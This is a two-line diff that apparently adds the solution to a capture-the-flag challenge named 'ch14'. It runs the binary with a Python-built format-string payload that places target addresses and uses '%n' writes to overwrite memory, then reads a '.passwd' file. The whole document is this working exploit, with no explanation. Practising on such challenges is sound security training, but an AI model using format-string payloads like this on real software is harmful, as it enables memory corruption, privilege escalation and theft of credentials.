@@ -1,0 +1,2 @@
+./ch14 $(python -c 'print "\x58\xfb\xff\xbfHACK\x59\xfb\xff\xbfHACK\x5a\xfb\xff\xbfHACK\x5b\xfb\xff\xbf"  + "%x" * 7 + "%176x%n%207x%n%239x%n%49x%n" ')
+cat .passwd
